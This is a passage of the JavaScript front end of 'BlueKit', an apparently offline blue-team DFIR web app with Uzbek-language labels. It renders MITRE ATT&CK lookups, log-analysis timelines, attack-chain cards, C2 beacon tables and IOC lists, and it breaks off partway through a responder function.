// BlueKit — DFIR & Blue Team Web App Controller (100% Offline)

let currentLogResult = null;
let currentTimelineEvents = [];
let filteredTimeline = [];
let currentPage = 1;
let pageSize = 50;
let activeFilterChip = 'all';
let hideCleanChains = false;

function showToast(msg) {
    const t = document.getElementById('toast');
    if (!t) return;
    t.innerText = msg;
    t.classList.add('show');
    setTimeout(() => t.classList.remove('show'), 2200);
}

function copyText(text, event) {
    if (event) event.stopPropagation();
    if (!text) return;
    if (navigator.clipboard && navigator.clipboard.writeText) {
        navigator.clipboard.writeText(text).then(() => {
            showToast("✓ Nusxalandi: " + text.slice(0, 35) + (text.length > 35 ? '...' : ''));
        }).catch(() => fallbackCopy(text));
    } else {
        fallbackCopy(text);
    }
}

function fallbackCopy(text) {
    const el = document.createElement('textarea');
    el.value = text;
    document.body.appendChild(el);
    el.select();
    document.execCommand('copy');
    document.body.removeChild(el);
    showToast("✓ Nusxalandi!");
}

function escapeHtml(str) {
    if (str === null || str === undefined) return '';
    return String(str)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#039;');
}

function showTab(id) {
    document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active'));
    document.querySelectorAll('.tab-btn').forEach(el => el.classList.remove('active'));
    const target = document.getElementById(id);
    if (target) target.classList.add('active');
    if (event && event.currentTarget) event.currentTarget.classList.add('active');
    if (id === 'tracker') loadTracker();
}

async function api(path, method='GET', body=null) {
    const opts = { method, headers: {} };
    if (body) {
        opts.headers['Content-Type'] = 'application/json';
        opts.body = JSON.stringify(body);
    }
    const res = await fetch(path, opts);
    const text = await res.text();
    try {
        return JSON.parse(text);
    } catch(e) {
        return {error: text};
    }
}

function renderTable(headers, rows) {
    if (!rows || rows.length === 0) return '<p style="color:var(--text-dim); padding:10px;">Natija topilmadi</p>';
    let html = '<div class="table-responsive"><table><thead><tr>' + headers.map(h => `<th>${h}</th>`).join('') + '</tr></thead><tbody>';
    for (let row of rows) {
        html += '<tr>' + row.map((c, i) => {
            if (c === 'revoked') return `<td><span class="badge badge-high">REVOKED</span></td>`;
            if (c === 'MISSING') return `<td><span class="coverage-pill missing">MISSING</span></td>`;
            if (c === 'COVERED') return `<td><span class="badge badge-success">COVERED</span></td>`;
            return `<td>${c !== undefined && c !== null ? c : ''}</td>`;
        }).join('') + '</tr>';
    }
    html += '</tbody></table></div>';
    return html;
}

function addToTrackerForm(id) {
    showTab('tracker');
    const trkField = document.getElementById('trk-c');
    if (trkField) trkField.value = id;
    showToast(`🎯 '${id}' Trackerga kiritildi`);
}

function trackerBtn(id) {
    return `<button class="action-btn btn-trk" onclick="event.stopPropagation(); addToTrackerForm('${id}')">➕ Tracker</button>`;
}

function copyBtn(text) {
    return `<button class="action-btn" title="Nusxa olish" onclick="event.stopPropagation(); copyText('${escapeHtml(text)}')">📋</button>`;
}

async function showMitreModal(attackId, event) {
    if (event) event.stopPropagation();
    const backdrop = document.getElementById('modal-backdrop');
    const modal = document.getElementById('mitre-modal');
    const body = document.getElementById('modal-body');
    const title = document.getElementById('modal-title');
    
    title.innerText = `[${attackId}] Qidirilmoqda...`;
    body.innerHTML = '<div class="spinner-container"><div class="spinner"></div><p style="color:var(--text-muted); font-size:12px;">MITRE ATT&CK bazasidan olinmoqda...</p></div>';
    backdrop.classList.add('active');
    modal.style.display = 'block';

    const res = await api(`/api/id?id=${encodeURIComponent(attackId)}`);
    if (res.error || !res || !res.length) {
        title.innerText = `[${attackId}]`;
        body.innerHTML = `<p style="color:var(--red);">Ma'lumot topilmadi: ${res.error || 'Bunday ID yo\'q'}</p>`;
        return;
    }
    const t = res[0];
    const isRev = t.status === 'revoked';
    title.innerHTML = `[${t.attack_id}] ${escapeHtml(t.name)} ${isRev ? '<span class="badge badge-high">REVOKED</span>' : '<span class="badge badge-success">ACTIVE</span>'}`;
    
    let html = '';
    if (isRev && t.revoked_by) {
        html += `<div style="background:var(--red-bg); border:1px solid var(--red-border); padding:10px 14px; border-radius:var(--radius-md); margin-bottom:14px; color:var(--red);">
            <b>⚠️ DIQQAT:</b> Ushbu ID eskirgan (revoked). O'rniga yangi ID: 
            <span class="tech-tag" onclick="showMitreModal('${t.revoked_by}')">${t.revoked_by}</span> ni ishlating!
        </div>`;
    }
    html += `
        <div class="detail-row"><span class="detail-key">Taktikalar:</span><span class="detail-val">${(t.tactics||[]).join(', ')}</span></div>
        <div class="detail-row"><span class="detail-key">Platformalar:</span><span class="detail-val">${t.platforms || 'All'}</span></div>
        <div class="detail-row"><span class="detail-key">Qisqacha Tavsif:</span>
            <div style="font-size:12.5px; line-height:1.6; color:var(--text-main); margin-top:4px; max-height:180px; overflow-y:auto; padding:8px; background:var(--bg-input); border-radius:var(--radius-md); border:1px solid var(--border);">
                ${escapeHtml(t.short_description || t.description || 'Tavsif yo\'q')}
            </div>
        </div>
        <div style="margin-top:16px; display:flex; gap:10px;">
            <button class="btn btn-sm btn-primary" onclick="copyText('${t.attack_id}')">📋 ID Nusxalash</button>
            <button class="btn btn-sm btn-secondary" onclick="addToTrackerForm('${t.attack_id}'); closeModal();">➕ Trackerga qo'shish</button>
            <a class="btn btn-sm btn-secondary" href="${t.url || ('https://attack.mitre.org/techniques/' + t.attack_id.replace('.', '/'))}" target="_blank" style="text-decoration:none;">🔗 MITRE Sahifasi</a>
        </div>
    `;
    body.innerHTML = html;
}

function closeModal() {
    const backdrop = document.getElementById('modal-backdrop');
    const modal = document.getElementById('mitre-modal');
    if (backdrop) backdrop.classList.remove('active');
    if (modal) modal.style.display = 'none';
}

function showEventDrawer(index) {
    const ev = currentTimelineEvents[index];
    if (!ev) return;
    const drawer = document.getElementById('event-drawer');
    const backdrop = document.getElementById('drawer-backdrop');
    const title = document.getElementById('drawer-title');
    const content = document.getElementById('drawer-content');
    
    title.innerText = `Hodisa #${ev.index !== undefined ? ev.index : index} — ${ev.host || 'Noma\'lum'}`;
    
    let techHtml = '';
    if (ev.techniques && ev.techniques.length) {
        techHtml = ev.techniques.map(t => {
            const confClass = t.confidence ? `badge-${t.confidence}` : 'badge-low';
            return `
            <div style="background:var(--bg-input); padding:10px 14px; border-radius:var(--radius-md); border:1px solid var(--border); margin-bottom:8px;">
                <div style="display:flex; justify-content:space-between; align-items:center;">
                    <span class="tech-tag" onclick="showMitreModal('${t.technique}', event)">${t.technique}</span>
                    <span class="badge ${confClass}">${t.confidence || 'info'}</span>
                </div>
                <div style="font-weight:700; font-size:13px; margin-top:6px; color:#fff;">${escapeHtml(t.name || '')}</div>
                <div style="font-size:11.5px; color:var(--text-muted); margin-top:4px;">${escapeHtml(t.evidence || '')}</div>
                <div style="margin-top:8px; display:flex; gap:6px;">
                    <button class="action-btn btn-sm" onclick="copyText('${t.technique}', event)">📋 ID Nusxa</button>
                    <button class="action-btn btn-trk btn-sm" onclick="addToTrackerForm('${t.technique}'); closeDrawer();">➕ Tracker</button>
                </div>
            </div>`;
        }).join('');
    } else {
        techHtml = '<p style="color:var(--text-dim); font-size:12px;">ATT&CK texnikasi belgilanmagan</p>';
    }
    
    content.innerHTML = `
        <div class="detail-row"><span class="detail-key">Vaqt (Timestamp):</span><span class="detail-val">${escapeHtml(ev.ts || 'N/A')}</span></div>
        <div class="detail-row"><span class="detail-key">Host / Kompyuter:</span><span class="detail-val">${escapeHtml(ev.host || 'N/A')}</span></div>
        <div class="detail-row"><span class="detail-key">Foydalanuvchi (User):</span><span class="detail-val">${escapeHtml(ev.user || 'N/A')}</span></div>
        <div class="detail-row"><span class="detail-key">Jarayon (Process):</span><span class="detail-val">${escapeHtml(ev.process || 'N/A')} (Parent: ${escapeHtml(ev.parent_process || 'N/A')})</span></div>
        <div class="detail-row">
            <div style="display:flex; justify-content:space-between; align-items:center;">
                <span class="detail-key">Buyruq Satri (Command Line):</span>
                <button class="action-btn" onclick="copyText('${escapeHtml(ev.command_line_full || ev.command_line || '')}', event)">📋 Nusxalash</button>
            </div>
            <div class="detail-val" style="white-space:pre-wrap; max-height:130px; overflow-y:auto;">${escapeHtml(ev.command_line_full || ev.command_line || 'N/A')}</div>
        </div>
        <div class="detail-row">
            <span class="detail-key">Aniqlangan Texnikalar (${(ev.techniques||[]).length}):</span>
            ${techHtml}
        </div>
        <div class="detail-row">
            <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:4px;">
                <span class="detail-key">Xom Log Qatori (Raw JSON):</span>
                <button class="action-btn" onclick="copyText(JSON.stringify(currentTimelineEvents[${index}].raw || currentTimelineEvents[${index}], null, 2), event)">📋 JSON Nusxa</button>
            </div>
            <pre style="max-height:220px;">${escapeHtml(JSON.stringify(ev.raw || ev, null, 2))}</pre>
        </div>
    `;
    backdrop.classList.add('active');
    drawer.classList.add('active');
}

function closeDrawer() {
    const backdrop = document.getElementById('drawer-backdrop');
    const drawer = document.getElementById('event-drawer');
    if (backdrop) backdrop.classList.remove('active');
    if (drawer) drawer.classList.remove('active');
}

// ==================== KB Functions ====================
// sources API'dan {sigma: 8, atomic: 8} ko'rinishida keladi
function fmtSources(s) {
    if (!s) return '';
    if (Array.isArray(s)) return s.join(', ');
    return Object.entries(s).map(([k, v]) => `${k}:${v}`).join(', ');
}

async function kbSearch() {
    const q = document.getElementById('kb-search-in').value;
    if (!q) return;
    const out = document.getElementById('kb-search-out');
    out.innerHTML = '<div class="spinner-container"><div class="spinner"></div></div>';
    let res;
    try {
        res = await api(`/api/search?q=${encodeURIComponent(q)}&n=20`);
    } catch (e) {
        return out.innerText = 'Server bilan aloqa xatosi: ' + e.message;
    }
    if (res.error) return out.innerText = res.error;
    if (!Array.isArray(res)) return out.innerText = 'Kutilmagan javob';
    const rows = res.map(r => [
        `<span class="tech-tag" onclick="showMitreModal('${r.attack_id}')">${r.attack_id}</span>`,
        escapeHtml(r.name),
        r.score.toFixed(3),
        `<span class="badge badge-${r.confidence}">${r.confidence}</span>`,
        fmtSources(r.sources),
        trackerBtn(r.attack_id) + ' ' + copyBtn(r.attack_id)
    ]);
    out.innerHTML = renderTable(['ID', 'Name', 'Score', 'Conf', 'Sources', 'Action'], rows);
}

async function kbValidate() {
    const ids = document.getElementById('kb-val-in').value;
    if (!ids) return;
    const out = document.getElementById('kb-val-out');
    out.innerHTML = '<div class="spinner-container"><div class="spinner"></div></div>';
    const res = await api(`/api/validate?ids=${encodeURIComponent(ids)}`);
    if (res.error) return out.innerText = res.error;
    const rows = res.map(r => {
        const isRev = r.status === 'revoked';
        const statusBadge = isRev ? '<span class="badge badge-high">REVOKED</span>' : (r.status === 'active' ? '<span class="badge badge-success">ACTIVE</span>' : `<span class="badge badge-medium">${r.status}</span>`);
        const repHtml = r.replacement ? `<span class="tech-tag" style="border-color:var(--green); color:var(--green);" onclick="showMitreModal('${r.replacement}')">${r.replacement} (YANGI ID)</span>` : '—';
        return [
            `<b>${escapeHtml(r.input)}</b>`,
            statusBadge,
            escapeHtml(r.name || ''),
            repHtml,
            r.replacement ? copyBtn(r.replacement) : copyBtn(r.input)
        ];
    });
    out.innerHTML = renderTable(['Kiritilgan ID', 'Holati', 'Texnika Nomi', 'Tavsiya Qilingan Almashtirish', 'Nusxa'], rows);
}

async function kbRelated() {
    const ids = document.getElementById('kb-rel-in').value;
    if (!ids) return;
    const out = document.getElementById('kb-rel-out');
    out.innerHTML = '<div class="spinner-container"><div class="spinner"></div></div>';
    const actors = document.getElementById('kb-rel-actors').checked ? '1' : '0';
    const res = await api(`/api/related?ids=${encodeURIComponent(ids)}&actors=${actors}`);
    if (res.error) return out.innerText = res.error;
    
    let html = '';
    if (res.techniques) {
        const rows = res.techniques.map(r => [
            `<span class="tech-tag" onclick="showMitreModal('${r.attack_id}')">${r.attack_id}</span>`,
            escapeHtml(r.name),
            `<span class="badge badge-medium">${r.probability}</span>`,
            r.support,
            (r.reasons||[]).join(', '),
            trackerBtn(r.attack_id)
        ]);
        html += renderTable(['ID', 'Name', 'Ehtimollik', 'Support', 'Sabablar', 'Action'], rows);
    }
    if (res.actors && res.actors.length) {
        html += '<h4 style="margin-top:20px; color:#fff;">O\'xshash TTP Aktorlari (Attribution emas):</h4>';
        const rows = res.actors.map(a => [
            `<b>${escapeHtml(a.name)}</b>`,
            a.type,
            `${a.matched_ids.length}`,
            (a.top_unobserved||[]).map(u => `<span class="tech-tag" onclick="showMitreModal('${u}')">${u}</span>`).join(' ')
        ]);
        html += renderTable(['Aktor Nomi', 'Turi', 'Mos Kelgan', 'Kuzatilmagan Texnikalar'], rows);
    }
    out.innerHTML = html;
}

async function kbIoc() {
    const v = document.getElementById('kb-ioc-in').value;
    if (!v) return;
    const out = document.getElementById('kb-ioc-out');
    out.innerHTML = '<div class="spinner-container"><div class="spinner"></div></div>';
    const res = await api(`/api/ioc?v=${encodeURIComponent(v)}&n=5`);
    if (res.error) return out.innerText = res.error;
    if (!res.classification) return out.innerText = "Aniqlanmadi";
    let html = `<p style="margin-bottom:10px;">Aniqlangan Tur: <span class="badge badge-medium">${res.classification.type}</span> &nbsp; Qiymat: <code>${escapeHtml(res.classification.value)}</code></p>`;
    if (res.techniques && res.techniques.length) {
        const rows = res.techniques.map(t => [
            `<span class="tech-tag" onclick="showMitreModal('${t.attack_id}')">${t.attack_id}</span>`,
            escapeHtml(t.name),
            (t.score||0).toFixed(3),
            `<span class="badge badge-${t.confidence}">${t.confidence}</span>`,
            trackerBtn(t.attack_id)
        ]);
        html += renderTable(['ID', 'Name', 'Score', 'Conf', 'Action'], rows);
    }
    out.innerHTML = html;
}

async function kbTactics() {
    const ids = document.getElementById('kb-tac-in').value;
    if (!ids) return;
    const out = document.getElementById('kb-tac-out');
    out.innerHTML = '<div class="spinner-container"><div class="spinner"></div></div>';
    const res = await api(`/api/tactics?ids=${encodeURIComponent(ids)}`);
    if (res.error) return out.innerText = res.error;
    const rows = res.map(r => [
        `<b>${r.shortname}</b>`,
        escapeHtml(r.name),
        r.missing ? 'MISSING' : 'COVERED',
        (r.observed||[]).map(o => `<span class="tech-tag" onclick="showMitreModal('${o}')">${o}</span>`).join(' ')
    ]);
    out.innerHTML = renderTable(['Taktika ID', 'Nomi', 'Status', 'Kuzatilgan Texnikalar'], rows);
}

// ==================== Logs Analyzer ====================
async function logAnalyze() {
    let body = {};
    const fileInput = document.getElementById('log-file');
    const path = document.getElementById('log-path').value;
    const btn = document.getElementById('btn-log-analyze');
    
    if (fileInput && fileInput.files.length > 0) {
        const file = fileInput.files[0];
        const content = await new Promise(r => { const rd = new FileReader(); rd.onload = e => r(e.target.result); rd.readAsText(file); });
        body = {content: content, filename: file.name};
    } else if (path.includes('\n') || path.includes(',')) {
        body = {content: path, filename: 'upload.csv'};
    } else if (path.trim()) {
        body = {path: path.trim()};
    } else {
        alert("Iltimos, fayl tanlang yoki yo'l kiriting!");
        return;
    }
    
    if (btn) btn.disabled = true;
    document.getElementById('log-out').innerHTML = `
        <div class="card spinner-container">
            <div class="spinner"></div>
            <p style="color:var(--text-main); font-weight:600; font-size:14px;">Loglar tahlil qilinmoqda...</p>
            <p style="color:var(--text-dim); font-size:12px;">ATT&CK korrelyatsiyasi, C2 va Timeline shajarasi yig'ilmoqda</p>
        </div>
    `;
    
    const res = await api('/api/logs/analyze', 'POST', body);
    if (btn) btn.disabled = false;
    if (res.error) return document.getElementById('log-out').innerHTML = `<div class="card" style="color:var(--red); border-color:var(--red-border);">${escapeHtml(res.error)}</div>`;
    
    currentLogResult = res;
    currentTimelineEvents = (res.timeline || []).map((t, idx) => {
        t._originalIndex = idx;
        return t;
    });
    
    renderLogsDashboard(res);
}

function renderLogsDashboard(res) {
    const totalEvents = currentTimelineEvents.length;
    const totalChains = (res.chains || []).length;
    const coveredTactics = (res.coverage || []).filter(c => !c.missing).length;
    const checkersCount = (res.checkers || []).length;
    
    let html = `
        <!-- KPI Cards Grid -->
        <div class="grid-4" style="margin-bottom: 20px;">
            <div class="stat-card">
                <span class="stat-label">Jami Hodisalar</span>
                <span class="stat-val">${totalEvents.toLocaleString()}</span>
            </div>
            <div class="stat-card">
                <span class="stat-label">Zanjirlar (Chains)</span>
                <span class="stat-val">${totalChains}</span>
            </div>
            <div class="stat-card warning">
                <span class="stat-label">Qamralgan Taktikalar</span>
                <span class="stat-val">${coveredTactics}</span>
            </div>
            <div class="stat-card danger">
                <span class="stat-label">C2 / Davriy Trafik</span>
                <span class="stat-val">${checkersCount}</span>
            </div>
        </div>

        <!-- ATT&CK Coverage Matrix -->
        <div class="card">
            <div class="card-title">
                <span>Cyber Kill Chain Qamrovi</span>
                <span class="brand-badge">${coveredTactics} / ${(res.coverage||[]).length} Taktika</span>
            </div>
            <div class="coverage-grid">
    `;
    
    if (res.coverage) {
        for (let c of res.coverage) {
            if (c.missing) {
                html += `<div class="coverage-pill missing"><b>${escapeHtml(c.name)}</b>: MISSING</div>`;
            } else {
                const techBadges = c.observed.map(t => `<span class="tech-tag" onclick="showMitreModal('${t}', event)">${t}</span>`).join(' ');
                html += `<div class="coverage-pill observed"><b>${escapeHtml(c.name)}</b>: ${techBadges}</div>`;
            }
        }
    }
    html += `
            </div>
        </div>

        <!-- Timeline Section with Quick Filters & Pagination -->
        <div class="card">
            <div class="card-title">
                <span>⏱ Hodisalar Xronologiyasi (Timeline)</span>
                <span id="timeline-count-badge" class="brand-badge">${totalEvents} ta hodisa</span>
            </div>

            <!-- Quick Filter Chips -->
            <div class="filter-chips">
                <span style="font-size:12px; color:var(--text-dim); margin-right:4px;">Tezkor Filtr:</span>
                <div class="filter-chip active" id="chip-all" onclick="setFilterChip('all')">Barchasi (${totalEvents})</div>
                <div class="filter-chip" id="chip-high" onclick="setFilterChip('high_medium')">🔴 Faqat High / Medium</div>
                <div class="filter-chip" id="chip-compromised" onclick="setFilterChip('compromised')">🛡 Faqat Zararlangan Hostlar</div>
                <div class="filter-chip" id="chip-c2" onclick="setFilterChip('c2')">📡 C2 / Davriy Aloqalar</div>
            </div>

            <!-- Search Inputs Bar -->
            <div class="filter-bar">
                <input type="text" id="log-f-host" placeholder="Host (masalan: web-prod-01)" onkeyup="triggerFilterDebounced()">
                <input type="text" id="log-f-tech" placeholder="Texnika (masalan: T1190)" onkeyup="triggerFilterDebounced()">
                <input type="text" id="log-f-free" placeholder="Matn (masalan: UNION, curl, root)" onkeyup="triggerFilterDebounced()">
                <label class="checkbox-label">
                    <input type="checkbox" id="log-f-low" onclick="applyFilters()">
                    Past ishonchlilarini yashirish (Hide Low)
                </label>
                <button class="action-btn" onclick="resetFilters()">Tozalash</button>
            </div>

            <!-- Timeline Table Container -->
            <div id="timeline-table-container"></div>
            
            <!-- Pagination Controls -->
            <div id="pagination-bar" class="pagination-container"></div>
        </div>

        <!-- Attack Chains Section -->
        <div class="card">
            <div class="card-title">
                <span>⛓ Hujum Zanjirlari (Chains)</span>
                <label class="checkbox-label">
                    <input type="checkbox" id="chk-hide-clean" onchange="toggleCleanChains(this.checked)">
                    Toza kompyuterlarni yashirish (Faqat zararlanganlar)
                </label>
            </div>
            <div class="chain-grid" id="chain-cards-container">
    `;
    
    if (res.chains) {
        for (let c of res.chains) {
            const hasTactics = c.tactics && c.tactics.length > 0;
            const compClass = hasTactics ? 'compromised' : 'clean';
            const tacticsPills = hasTactics 
                ? c.tactics.map(t => `<span class="tactic-pill">${escapeHtml(t)}</span>`).join('') 
                : '<span style="color:var(--text-dim); font-size:11px;">no tactics (toza)</span>';
            
            html += `
                <div class="chain-card ${compClass}" data-clean="${!hasTactics}">
                    <div class="chain-header">
                        <span class="chain-host">Host: ${escapeHtml(c.host)}</span>
                        ${hasTactics ? '<span class="badge badge-high">⚠️ ATTACK CHAIN</span>' : '<span class="badge badge-low">CLEAN</span>'}
                    </div>
                    <div style="font-size:11.5px; color:var(--text-muted);">Foydalanuvchi: <b>${escapeHtml(c.user || 'N/A')}</b> · Hodisalar: ${c.events ? c.events.length : 0} ta</div>
                    <div class="chain-tactics">${tacticsPills}</div>
                    <div style="margin-top:10px;">
                        <button class="action-btn btn-sm" onclick="filterByHost('${escapeHtml(c.host)}')">Faqat ushbu hostni ko'rish</button>
                    </div>
                </div>
            `;
        }
    }
    html += `
            </div>
        </div>

        <!-- Checker / Beacon Section -->
        <div class="card">
            <div class="card-title">
                <span>📡 Checker / C2 Beacon (Davriy trafik deteksiyasi)</span>
                <span class="brand-badge" style="border-color:var(--red); color:var(--red);">Tekshiring</span>
            </div>
            <p style="font-size:12px; color:var(--text-muted); margin-bottom:12px;">
                Doimiy interval bilan takrorlanuvchi ulanishlar. CTF scoreboard checkeri YOKI tajovuzkorning C2 kanali bo'lishi mumkin!
            </p>
    `;
    if (res.checkers && res.checkers.length) {
        const rows = res.checkers.map(c => [
            `<code>${escapeHtml(c.src || '')}</code>`,
            `<code>${escapeHtml(c.dst || '')}</code>`,
            `<span class="badge badge-medium">${c.interval_seconds != null ? c.interval_seconds + 's' : ''}</span>`,
            `<b>${c.count || ''}</b>`,
            c.first || '',
            c.last || '',
            copyBtn(c.dst || '') + ' ' + `<button class="action-btn" onclick="filterByDst('${escapeHtml(c.dst||'')}')">Filtrlash</button>`
        ]);
        html += renderTable(['Manba IP (Src)', 'Nishon IP (Dst)', 'Davriylik (Interval)', 'Soni', 'Boshlanish', 'Tugash', 'Action'], rows);
    } else {
        html += '<p style="color:var(--text-dim); font-size:12.5px;">Davriy trafik (checker/beacon) topilmadi.</p>';
    }
    html += `
        </div>

        <!-- IOC Section -->
        <div class="card">
            <div class="card-title">
                <span>🎯 Ajratib Olingan IOC Indikatorlari</span>
                <span class="brand-badge">${(res.iocs||[]).length} ta IOC</span>
            </div>
    `;
    if (res.iocs && res.iocs.length) {
        const rows = res.iocs.map(i => [
            `<span class="badge badge-low">${escapeHtml(i.type || '')}</span>`,
            `<code class="code-cell">${escapeHtml(i.value || '')}</code>`,
            `<b>${i.count || ''}</b>`,
            i.first || '',
            i.last || '',
            copyBtn(i.value || '')
        ]);
        html += renderTable(['Turi', 'Indikator (Qiymat)', 'Chastotasi', 'Birinchi ko\'rindi', 'Oxirgi ko\'rindi', 'Nusxa'], rows);
    } else {
        html += '<p style="color:var(--text-dim); font-size:12.5px;">IOC topilmadi.</p>';
    }
    html += '</div>';

    document.getElementById('log-out').innerHTML = html;
    
    // Apply default filters and render timeline page
    applyFilters();
}

let filterDebounceTimer = null;
function triggerFilterDebounced() {
    clearTimeout(filterDebounceTimer);
    filterDebounceTimer = setTimeout(applyFilters, 150);
}

function setFilterChip(chip) {
    activeFilterChip = chip;
    document.querySelectorAll('.filter-chip').forEach(el => el.classList.remove('active'));
    const activeEl = document.getElementById(`chip-${chip}`);
    if (activeEl) activeEl.classList.add('active');
    applyFilters();
}

function filterByHost(host) {
    const hostInput = document.getElementById('log-f-host');
    if (hostInput) hostInput.value = host;
    setFilterChip('all');
    applyFilters();
    window.scrollTo({ top: document.getElementById('timeline-table-container').offsetTop - 120, behavior: 'smooth' });
}

function filterByDst(ip) {
    const freeInput = document.getElementById('log-f-free');
    if (freeInput) freeInput.value = ip;
    applyFilters();
    window.scrollTo({ top: document.getElementById('timeline-table-container').offsetTop - 120, behavior: 'smooth' });
}

function resetFilters() {
    const h = document.getElementById('log-f-host'); if (h) h.value = '';
    const t = document.getElementById('log-f-tech'); if (t) t.value = '';
    const f = document.getElementById('log-f-free'); if (f) f.value = '';
    const l = document.getElementById('log-f-low'); if (l) l.checked = false;
    setFilterChip('all');
}

function toggleCleanChains(hide) {
    hideCleanChains = hide;
    const cards = document.querySelectorAll('.chain-card[data-clean="true"]');
    cards.forEach(c => {
        c.style.display = hide ? 'none' : 'block';
    });
}

function applyFilters() {
    if (!currentTimelineEvents || !currentTimelineEvents.length) return;
    
    const hostVal = (document.getElementById('log-f-host')?.value || '').toLowerCase().trim();
    const techVal = (document.getElementById('log-f-tech')?.value || '').toLowerCase().trim();
    const freeVal = (document.getElementById('log-f-free')?.value || '').toLowerCase().trim();
    const hideLow = document.getElementById('log-f-low')?.checked || false;
    
    // Compromised hosts set from chains
    const compHosts = new Set();
    if (currentLogResult && currentLogResult.chains) {
        currentLogResult.chains.forEach(c => {
            if (c.tactics && c.tactics.length > 0 && c.host) compHosts.add(c.host.toLowerCase());
        });
    }

    filteredTimeline = currentTimelineEvents.filter(ev => {
        const conf = (ev.primary_confidence || '').toLowerCase();
        
        // Quick chip filter
        if (activeFilterChip === 'high_medium') {
            if (conf !== 'high' && conf !== 'medium') return false;
        } else if (activeFilterChip === 'compromised') {
            if (!ev.host || !compHosts.has(ev.host.toLowerCase())) return false;
        } else if (activeFilterChip === 'c2') {
            const rawStr = JSON.stringify(ev.raw || ev).toLowerCase();
            if (!rawStr.includes('203.0.113.88') && !rawStr.includes('198.51.100.45')) return false;
        }
        
        // Hide low-confidence checkbox
        if (hideLow && conf === 'low') return false;
        
        // Host filter
        if (hostVal && !(ev.host || '').toLowerCase().includes(hostVal)) return false;
        
        // Technique filter
        if (techVal) {
            const tMatch = (ev.techniques || []).some(t => (t.technique || '').toLowerCase().includes(techVal) || (t.name || '').toLowerCase().includes(techVal));
            if (!tMatch) return false;
        }
        
        // Free text filter
        if (freeVal) {
            const fullText = ((ev.command_line_full || ev.command_line || '') + ' ' + (ev.host || '') + ' ' + (ev.user || '') + ' ' + (ev.message || '')).toLowerCase();
            if (!fullText.includes(freeVal)) return false;
        }
        
        return true;
    });

    currentPage = 1;
    renderTimelinePage();
}

function renderTimelinePage() {
    const container = document.getElementById('timeline-table-container');
    const paginationBar = document.getElementById('pagination-bar');
    const countBadge = document.getElementById('timeline-count-badge');
    if (!container) return;
    
    const total = filteredTimeline.length;
    if (countBadge) countBadge.innerText = `${total.toLocaleString()} ta mos keldi`;
    
    if (total === 0) {
        container.innerHTML = '<div style="padding:40px; text-align:center; color:var(--text-dim); font-size:14px;">Filtrlarga mos keluvchi hodisalar topilmadi</div>';
        if (paginationBar) paginationBar.innerHTML = '';
        return;
    }
    
    const totalPages = Math.ceil(total / pageSize) || 1;
    if (currentPage > totalPages) currentPage = totalPages;
    if (currentPage < 1) currentPage = 1;
    
    const startIdx = (currentPage - 1) * pageSize;
    const endIdx = Math.min(startIdx + pageSize, total);
    const pageItems = filteredTimeline.slice(startIdx, endIdx);
    
    let tableHtml = `
        <div class="table-responsive">
            <table>
                <thead>
                    <tr>
                        <th style="width:170px;">Vaqt (Timestamp)</th>
                        <th style="width:130px;">Host</th>
                        <th>Buyruq / Hodisa Xabari</th>
                        <th style="width:160px;">ATT&amp;CK Texnikalari</th>
                        <th style="width:90px;">Xavf</th>
                        <th style="width:120px;">Harakat</th>
                    </tr>
                </thead>
                <tbody>
    `;
    
    for (let t of pageItems) {
        const conf = t.primary_confidence || 'none';
        const badgeClass = conf === 'high' ? 'badge-high' : (conf === 'medium' ? 'badge-medium' : (conf === 'low' ? 'badge-low' : ''));
        const cmdDisplay = escapeHtml(t.command_line || t.message || '');
        const fullCmd = escapeHtml(t.command_line_full || t.command_line || t.message || '');
        
        const techTags = (t.techniques || [])
            .filter(x => x.confidence === 'high' || x.confidence === 'medium')
            .map(x => `<span class="tech-tag" onclick="showMitreModal('${x.technique}', event)">${x.technique}</span>`)
            .join(' ');
            
        tableHtml += `
            <tr class="cursor-pointer" onclick="showEventDrawer(${t._originalIndex})">
                <td style="font-family:var(--font-mono); font-size:11.5px; color:var(--text-muted);">${escapeHtml(t.ts || '')}</td>
                <td><b>${escapeHtml(t.host || '—')}</b></td>
                <td class="code-cell" title="${fullCmd}">${cmdDisplay}</td>
                <td>${techTags || '<span style="color:var(--text-dim); font-size:11px;">—</span>'}</td>
                <td>${badgeClass ? `<span class="badge ${badgeClass}">${conf}</span>` : '—'}</td>
                <td>
                    <div style="display:flex; gap:4px;" onclick="event.stopPropagation()">
                        ${t.primary_technique ? trackerBtn(t.primary_technique) : ''}
                        ${copyBtn(t.command_line_full || t.command_line || '')}
                    </div>
                </td>
            </tr>
        `;
    }
    tableHtml += `</tbody></table></div>`;
    container.innerHTML = tableHtml;
    
    // Pagination Controls
    let pagHtml = `
        <div>
            Ko'rsatilmoqda: <b>${(startIdx + 1).toLocaleString()}–${endIdx.toLocaleString()}</b> / jami <b>${total.toLocaleString()}</b> ta
        </div>
        <div class="pagination-controls">
            <button class="page-btn" onclick="goToPage(1)" ${currentPage === 1 ? 'disabled' : ''}>⏮</button>
            <button class="page-btn" onclick="goToPage(${currentPage - 1})" ${currentPage === 1 ? 'disabled' : ''}>◀ Oldingi</button>
            <span style="font-size:12px; font-weight:600; padding:0 8px;">${currentPage} / ${totalPages}</span>
            <button class="page-btn" onclick="goToPage(${currentPage + 1})" ${currentPage === totalPages ? 'disabled' : ''}>Keyingi ▶</button>
            <button class="page-btn" onclick="goToPage(${totalPages})" ${currentPage === totalPages ? 'disabled' : ''}>⏭</button>
            <select style="width:auto; margin-bottom:0; padding:4px 8px; font-size:12px; margin-left:8px;" onchange="changePageSize(this.value)">
                <option value="25" ${pageSize===25?'selected':''}>25 / sahifa</option>
                <option value="50" ${pageSize===50?'selected':''}>50 / sahifa</option>
                <option value="100" ${pageSize===100?'selected':''}>100 / sahifa</option>
                <option value="500" ${pageSize===500?'selected':''}>500 / sahifa</option>
            </select>
        </div>
    `;
    if (paginationBar) paginationBar.innerHTML = pagHtml;
}

function goToPage(page) {
    currentPage = page;
    renderTimelinePage();
}

function changePageSize(val) {
    pageSize = parseInt(val, 10) || 50;
    currentPage = 1;
    renderTimelinePage();
}

// ==================== Responder Functions ====================
async function getRespArgs() {
    let args = {};
    const snapFile = document.getElementById('resp-snap-file')?.files?.[0];
    if (snapFile) {
        args.current_content = await new Promise(r => { const rd = new FileReader(); rd.onload = e => r(e.target.result); rd.readAsText(snapFile); });
        args.current_filename = snapFile.name;
